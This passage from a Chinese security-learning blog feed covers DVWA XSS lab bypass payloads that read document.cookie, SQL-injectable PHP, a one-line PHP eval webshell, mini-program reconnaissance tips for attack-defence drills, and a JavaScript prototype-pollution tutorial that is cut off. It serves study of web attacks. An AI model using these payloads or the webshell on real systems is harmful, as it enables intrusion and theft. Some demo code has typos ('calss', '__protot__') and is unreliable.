<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">后端<span class="number">1</span>.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">      <span class="variable">$id</span>=<span class="variable">$_POST</span>[<span class="string">&quot;id&quot;</span>];</span><br><span class="line">      <span class="variable">$name</span>=<span class="variable">$_POST</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">      <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);<span class="comment">//建立与数据库的连接</span></span><br><span class="line">      <span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&quot;test&quot;</span>);<span class="comment">//选择text数据库</span></span><br><span class="line">      </span><br><span class="line">      <span class="variable">$sql</span>=<span class="string">&quot;insert into xss value (<span class="subst">$id</span>,&#x27;<span class="subst">$name</span>&#x27;)&quot;</span>;</span><br><span class="line">      <span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">用户查看时的代码</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">      <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">      <span class="variable">$sql</span>=<span class="string">&quot;select * from xss where id=1&quot;</span>;</span><br><span class="line">      <span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">      <span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这样子就导致我们输入的内容存储到数据库中，每次有用户访问时就会触发。</p>
<h1 id="DOM型漏洞"><a href="#DOM型漏洞" class="headerlink" title="DOM型漏洞"></a>DOM型漏洞</h1><img src="/2024/01/08/xss%E6%B3%A8%E5%85%A5/1.png" class="" title="Alt text">
<p>基于DOM的XSS一般不会与服务器进行交互，这个漏洞是由于前端的JS代码不严谨造成的，读取、执行恶意JS代码只由浏览器完成。</p>
<h1 id="DVWA-DOM-Based-Cross-Site-Scripting"><a href="#DVWA-DOM-Based-Cross-Site-Scripting" class="headerlink" title="DVWA DOM Based Cross Site Scripting"></a>DVWA DOM Based Cross Site Scripting</h1><h1 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h1><p>我们打开源码发现是全空，所以我们打开f12查看前端代码，发现了如下js代码<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> lang = <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">substring</span>(<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span><br><span class="line">	<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + <span class="built_in">decodeURI</span>(lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span><br><span class="line">	<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&#x27; disabled=&#x27;disabled&#x27;&gt;----&lt;/option&gt;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">					    </span><br><span class="line">	<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;English&#x27;&gt;English&lt;/option&gt;&quot;</span>);</span><br><span class="line">	<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;French&#x27;&gt;French&lt;/option&gt;&quot;</span>);</span><br><span class="line">	<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;Spanish&#x27;&gt;Spanish&lt;/option&gt;&quot;</span>);</span><br><span class="line">	<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;German&#x27;&gt;German&lt;/option&gt;&quot;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>)</span><br><span class="line"><span class="comment">//该函数由document.location.href和indexOf()组成，</span></span><br><span class="line"><span class="comment">//documennt.location.href是获取url的函数，indexOf(&quot;default=&quot;)的意思是返回default=后的内容(包括default=)</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">substring</span>(<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>)<span class="comment">//返回url的default=后的内容，+8是为了跳过default=</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + <span class="built_in">decodeURI</span>(lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);<span class="comment">//将括号内的字符串输出到web页面上这时候就存在DOM型的xss漏洞</span></span><br></pre></td></tr></table></figure><br>我们输入<code>?default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>这时由于LOW没有做任何过滤导致屏幕会直接弹出cookie值。</p>
<h1 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h1><p>相比low多了个<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span> (<span class="variable">$default</span>, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">       <span class="title function_ invoke__">header</span> (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">       <span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure><br>我们可以直接使用img来创造payload，注意由于option无法进行解析img。所以我们要闭合select和option<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?default=&lt;/option&gt;&lt;/select&gt;&lt;img%20src=x%20onerror=alert(document.cookie)&gt;</span><br></pre></td></tr></table></figure></p>
<h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p>我们查看源码发现多了个switch语句导致如果输入的不为指定的语言就会停止运行，这时候我们由以下几种方法绕过</p>
<h2 id="1-使用-来进行绕过"><a href="#1-使用-来进行绕过" class="headerlink" title="1.使用#来进行绕过"></a>1.使用#来进行绕过</h2><p>由于浏览器不会将url#之后的值传递给后端，但是由于DOM是由于js所引起的漏洞，导致我们可以使用#绕过<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?default=English#&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="2-使用多变量传值绕过"><a href="#2-使用多变量传值绕过" class="headerlink" title="2.使用多变量传值绕过"></a>2.使用多变量传值绕过</h2><p>由于php代码只判断default的值，但是前端代码会将url的default=之后的所有字符输出到web上，所有我们可以采用多变量绕过<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?default=English&amp;a=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<h1 id="Reflected-Cross-Site-Scripting-XSS"><a href="#Reflected-Cross-Site-Scripting-XSS" class="headerlink" title="Reflected Cross Site Scripting (XSS)"></a>Reflected Cross Site Scripting (XSS)</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从源码查看我们可以看到该反射性xss没有任何过滤所以我们直接输入<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;#</span><br></pre></td></tr></table></figure></p>
<h1 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h1><p>我们查看源码<br>多了<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br></pre></td></tr></table></figure><br>我们可以发现这是使用str_replace()来进行过滤我们可以进行以下绕过</p>
<h2 id="1-双写绕过"><a href="#1-双写绕过" class="headerlink" title="1.双写绕过"></a>1.双写绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/scr&lt;script&gt;ipt&gt;#</span><br></pre></td></tr></table></figure>
<h2 id="2-lt-img-gt-绕过"><a href="#2-lt-img-gt-绕过" class="headerlink" title="2.&lt;img&gt;绕过"></a>2.<code>&lt;img&gt;</code>绕过</h2><p>使用img标签进行绕过<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img%20src=x%20onerror=alert(document.cookie)&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="3-大小写绕过"><a href="#3-大小写绕过" class="headerlink" title="3.大小写绕过"></a>3.大小写绕过</h2><p>由于str_replace不忽略大小写所以可以使用<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&lt;sCript&gt;alert(document.cookie)&lt;/scRipt&gt;#</span><br></pre></td></tr></table></figure></p>
<h2 id="4-lt-iframe-onload-alert-document-cookie-gt"><a href="#4-lt-iframe-onload-alert-document-cookie-gt" class="headerlink" title="4.&lt;iframe onload=alert(document.cookie)&gt;"></a>4.<code>&lt;iframe onload=alert(document.cookie)&gt;</code></h2><h1 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h1><p>过滤了script所以使用img和iframe就可以</p>
<h1 id="Stored-Cross-Site-Scripting-XSS"><a href="#Stored-Cross-Site-Scripting-XSS" class="headerlink" title="Stored Cross Site Scripting (XSS)"></a>Stored Cross Site Scripting (XSS)</h1><h2 id="LOW-1"><a href="#LOW-1" class="headerlink" title="LOW"></a>LOW</h2><p>没有过滤我们直接在留言板写恶意代码即可</p>
<h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2>]]></content>
      <categories>
        <category>top10</category>
      </categories>
      <tags>
        <tag>top10</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>一句话木马</title>
    <url>/2023/11/14/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
    <content><![CDATA[<h1 id="这篇文章是关于一句话木马的文章"><a href="#这篇文章是关于一句话木马的文章" class="headerlink" title="这篇文章是关于一句话木马的文章"></a>这篇文章是关于一句话木马的文章</h1><p>一句话木马可以说是最简单吗木马了，代码如下<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>php</category>
        <category>webshell</category>
      </categories>
      <tags>
        <tag>木马</tag>
      </tags>
  </entry>
  <entry>
    <title>再谈外网信息收集(微信小程序)</title>
    <url>/2024/06/02/%E5%86%8D%E8%B0%88%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h1 id="好久没有水博客了。主要是最近考试还有，打攻防太忙了，刚打完上周的攻防，做了5天的牢主要都是在信息收集，发现攻防要打的好，信息收集是一定要做好的。"><a href="#好久没有水博客了。主要是最近考试还有，打攻防太忙了，刚打完上周的攻防，做了5天的牢主要都是在信息收集，发现攻防要打的好，信息收集是一定要做好的。" class="headerlink" title="好久没有水博客了。主要是最近考试还有，打攻防太忙了，刚打完上周的攻防，做了5天的牢主要都是在信息收集，发现攻防要打的好，信息收集是一定要做好的。"></a>好久没有水博客了。主要是最近考试还有，打攻防太忙了，刚打完上周的攻防，做了5天的牢主要都是在信息收集，发现攻防要打的好，信息收集是一定要做好的。</h1><h1 id="从小程序开始信息收集"><a href="#从小程序开始信息收集" class="headerlink" title="从小程序开始信息收集"></a>从小程序开始信息收集</h1><p>打了这次攻防，我发现现在各种系统后台的弱密码已经非常少了。直接使用fofa等工具来找很容易出现打歪的情况。<br>而在这次攻防里我学到了可以从小程序来进行信息收集，因为小程序是近几年才兴起的，这回导致很多公司对小程序的安全并不重视，这就会导致小程序背后的网站经常会出现，弱密码和常见的框架漏洞。</p>
<p>很多小程序虽然是放在了微信上但是其实就是魔改的网站罢了，我们通过bp来抓包会发现很多小程序的很多功能走的都是http的协议，题目http报文我们就可以发现其所连接的网站，从而找到其后台网站，而这些后台网站一般都是很薄弱的资产，大部分存在弱密码，而且很多是使用的开源宽假（而且是老版本的）而通过小程序找到的网站我们有可以在通过ip反查，爆破子域名等来扩大资产。<br>这里我贴一个大神写的文章<a href="https://cloud.tencent.com/developer/article/1835727">微信小程序的修炼五脉</a>这位大神的这个系列文章共有五篇。干货满满。</p>
<h1 id=""><a href="#" class="headerlink" title=" "></a> </h1>]]></content>
      <categories>
        <category>攻防</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>攻防</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>函数</title>
    <url>/2023/10/29/%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="简介：这是我在洛谷刷题时遇到的函数题目为了能够更好的理解这道题目我会将的解题过程书写在这篇文章里。"><a href="#简介：这是我在洛谷刷题时遇到的函数题目为了能够更好的理解这道题目我会将的解题过程书写在这篇文章里。" class="headerlink" title="简介：这是我在洛谷刷题时遇到的函数题目为了能够更好的理解这道题目我会将的解题过程书写在这篇文章里。"></a>简介：这是我在洛谷刷题时遇到的函数题目为了能够更好的理解这道题目我会将的解题过程书写在这篇文章里。</h1><h1 id="先挖个坑后面在填-看排序"><a href="#先挖个坑后面在填-看排序" class="headerlink" title="先挖个坑后面在填(看排序)"></a>先挖个坑后面在填(看排序)</h1>]]></content>
      <categories>
        <category>c语言</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>初探linux提权</title>
    <url>/2024/03/11/%E5%88%9D%E6%8E%A2linux%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>攻防</category>
      </categories>
      <tags>
        <tag>提权</tag>
        <tag>liunx</tag>
      </tags>
  </entry>
  <entry>
    <title>初探JavaScript原型链污染</title>
    <url>/2024/01/28/%E5%88%9D%E6%8E%A2JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    <content><![CDATA[<h1 id="写这篇文章的原因是我在放寒假经过了长久的摆烂后痛定思痛不能再这么下去了，因为明天就是hgame了所有我想着刷点hgame的内容，结果找不到复现平台，只在NSS上找到一些，这篇文章是我在写week4的Shared-Diary-Antel0p3时遇到了原型链污染，一点都不会所以我就打算学习一下JavaScript的原型链污染。"><a href="#写这篇文章的原因是我在放寒假经过了长久的摆烂后痛定思痛不能再这么下去了，因为明天就是hgame了所有我想着刷点hgame的内容，结果找不到复现平台，只在NSS上找到一些，这篇文章是我在写week4的Shared-Diary-Antel0p3时遇到了原型链污染，一点都不会所以我就打算学习一下JavaScript的原型链污染。" class="headerlink" title="写这篇文章的原因是我在放寒假经过了长久的摆烂后痛定思痛不能再这么下去了，因为明天就是hgame了所有我想着刷点hgame的内容，结果找不到复现平台，只在NSS上找到一些，这篇文章是我在写week4的Shared Diary Antel0p3时遇到了原型链污染，一点都不会所以我就打算学习一下JavaScript的原型链污染。"></a>写这篇文章的原因是我在放寒假经过了长久的摆烂后痛定思痛不能再这么下去了，因为明天就是hgame了所有我想着刷点hgame的内容，结果找不到复现平台，只在NSS上找到一些，这篇文章是我在写week4的Shared Diary Antel0p3时遇到了原型链污染，一点都不会所以我就打算学习一下JavaScript的原型链污染。</h1><h1 id="原型链污染的前置知识"><a href="#原型链污染的前置知识" class="headerlink" title="原型链污染的前置知识"></a>原型链污染的前置知识</h1><h2 id="js的对象"><a href="#js的对象" class="headerlink" title="js的对象"></a>js的对象</h2><h3 id="对象创建的几种方式"><a href="#对象创建的几种方式" class="headerlink" title="对象创建的几种方式"></a>对象创建的几种方式</h3><h4 id="1-通过字面量模式创建"><a href="#1-通过字面量模式创建" class="headerlink" title="1.通过字面量模式创建"></a>1.通过字面量模式创建</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a=&#123;<span class="attr">a</span>:<span class="string">&quot;aa&quot;</span>,b=<span class="string">&quot;cc&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<h4 id="2-通过类来进行创建"><a href="#2-通过类来进行创建" class="headerlink" title="2.通过类来进行创建"></a>2.通过类来进行创建</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">calss a&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name,age</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">age</span>=age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> b=<span class="keyword">new</span> <span class="title function_">a</span>(lss,<span class="number">18</span>);</span><br></pre></td></tr></table></figure>
<p>通过类来创建对象，<code>constructor()</code>是自带的函数。</p>
<h4 id="3-通过构造函数来进行创建对象"><a href="#3-通过构造函数来进行创建对象" class="headerlink" title="3.通过构造函数来进行创建对象"></a>3.通过构造函数来进行创建对象</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Add</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">a</span>=<span class="string">&quot;a&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">b</span>=<span class="string">&quot;c&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a=<span class="keyword">new</span> <span class="title class_">Add</span>()</span><br></pre></td></tr></table></figure>
<p>注意需要在构造函数的属性前加this.<br>在早期版本的JavaScript里是没有class关键词的，所以构造函数法的函数我们可以将其理解为类。</p>
<h2 id="proto和prototype，constructor"><a href="#proto和prototype，constructor" class="headerlink" title="proto和prototype，constructor"></a><strong>proto</strong>和prototype，constructor</h2><p>我们都知道类里一般都是由定义函数的如下<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Add</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">a</span>=<span class="string">&quot;a&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">b</span>=<span class="string">&quot;c&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">aler</span>=<span class="keyword">function</span> <span class="title function_">lss</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;lll&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a=<span class="keyword">new</span> <span class="title class_">Add</span>()</span><br></pre></td></tr></table></figure><br>当我们将构造函数实例化成多个对象时我们可以发现其会重复的实例类里的函数，这回造成不必要的内存占用，这时候就需要原型（prototype）的出场了。<br>我们可以认为原型prototype是类Add的一个属性，而所有用Add类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。<br>如下<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Add</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">a</span>=<span class="string">&quot;a&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">b</span>=<span class="string">&quot;c&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Add</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">aler</span>=<span class="keyword">function</span> <span class="title function_">lss</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;lll&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">var</span> a=<span class="keyword">new</span> <span class="title class_">Add</span>()</span><br><span class="line">a.<span class="title function_">aler</span>()</span><br></pre></td></tr></table></figure><br>当对象在自己的属性里找不到该方法时，他回向原型里找，如果原型找不到就从原型的原型里找。<br>这样在我们创建了这个对象，我们就可以通过原型来使用这个方法。</p>
<p>我们可以通过<code>Add.prototype</code>来访问类Add的原型，但是当把类实例化成对象时就不能通过<code>prototype</code>来对其实原型进行访问则我们需要使用<code>__proto__</code>也就是<code>Add.prototype==a.__proto__</code><br><img src="/2024/01/28/%E5%88%9D%E6%8E%A2JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/2.png" class="" title="Alt text"></p>
<p>实例化后的对象存在一个属性为constructor，该属性指向了该对象的构造函数也就是类，即<code>a.constructor==Add</code><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Add</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">a</span>=<span class="string">&quot;a&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">b</span>=<span class="string">&quot;c&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a=<span class="keyword">new</span> <span class="title class_">Add</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">constructor</span>)</span><br><span class="line">a.<span class="property">constructor</span>==<span class="title class_">Add</span></span><br></pre></td></tr></table></figure><br><img src="/2024/01/28/%E5%88%9D%E6%8E%A2JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1.png" class="" title="Alt text"></p>
<p>函数或者说类的原型是通过prototype来寻找找到。<br>实例化后的对象是通过<strong>proto</strong>来指向原型的。也就是指向对象类的prototype属性。</p>
<h1 id="javascript的原型链继承"><a href="#javascript的原型链继承" class="headerlink" title="javascript的原型链继承"></a>javascript的原型链继承</h1><p>所有类对象在实例化的时候将会拥有prototype中的属性和方法，这个特性被用来实现JavaScript中的继承机制。<br>如:<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;lll&#x27;</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">last_name</span> = <span class="string">&#x27;sss&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;eee&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure><br>上述代码将类Son的原型赋值一个<code>new Father</code>，这使<code>Son</code>的原型有了<code>Father</code>的属性，当我们输出找<code>son.first_name</code>时会输出 <code>eee</code>这是因为调用son的first_name是会先查找son里有无，没有才会从其原型中查找。<br>所以当我们查找<code>son.last_name</code>会返回<code>sss</code>这是因为son类里没有只能从其原型中查找。</p>
<p>小总结：<br>1.每个构造函数(constructor)都有一个原型对象(prototype)<br>2.对象的<strong>proto</strong>属性，指向类的原型对象prototype<br>3.JavaScript使用prototype链实现继承机制</p>
<h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><h2 id="什么是原型链污染"><a href="#什么是原型链污染" class="headerlink" title="什么是原型链污染"></a>什么是原型链污染</h2><p>我们都知道什么是原型，那么我们可以思考一下，有多个类其原型（把原型想像成父类）相同，而绝大多数的对象其原型最终都指向Object.prototype，这也就导致了大多数的对象都可以继承Object.prototype的方法和属性，那么我们如果能将一个对象原型进行修改，这时候就有可能会影响到其他对象，因为两个对象的原型有可能为同一个。我们可以做个小实验<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a=&#123;<span class="attr">num</span>:<span class="number">1</span>,<span class="attr">name</span>:<span class="string">&quot;lssee&quot;</span>&#125;<span class="comment">//创建对象a</span></span><br><span class="line"><span class="keyword">var</span> b=&#123;&#125;<span class="comment">//创建一个空对象</span></span><br><span class="line">a.<span class="property">__proto__</span>.<span class="property">num</span>=<span class="number">9999</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">num</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b.<span class="property">num</span>)</span><br></pre></td></tr></table></figure><br>像上述代码中，<code>a.num</code>返回1,<code>b.num</code>返回9999这是因为a与b的原型都是Object.getPrototype。那么就a的原型修改就是将b的原型修改，那么这时候b里找num找不到就会区原型中寻找。</p>
<p>在一个web中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。</p>
<h1 id="原型链污染的情况"><a href="#原型链污染的情况" class="headerlink" title="原型链污染的情况"></a>原型链污染的情况</h1><p>我们都知道，我们可以把<strong>proto</strong>看成一个对象的键名(也就是属性名)其键值就是原型，那么只要出现我们可以控制一个对象的键名的情况即可，我们可以将<strong>protot</strong>当成键值传入。<br>出现这种情况的原因主要如下。<br>对象merge<br>对象clone（其实内核就是将待操作的对象merge到一个空对象中）<br>以对象merge为例，我们想象一个简单的merge函数：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>上述代码在将两个对象合并的过程中存在 <code>target[key] = source[key]</code>在这个赋值过程中如果key为<strong>protot</strong>那么就会产生污染。<br>我们做个实验试试<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a=&#123;<span class="attr">num</span>:<span class="string">&quot;lll&quot;</span>,<span class="string">&quot;__protot__&quot;</span>:&#123;<span class="attr">b</span>:<span class="string">&quot;bbb&quot;</span>&#125;&#125;</span><br><span class="line"><span class="keyword">var</span> b=&#123;&#125;</span><br><span class="line"><span class="title function_">merge</span>(b, a)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">num</span>,a.<span class="property">b</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b.<span 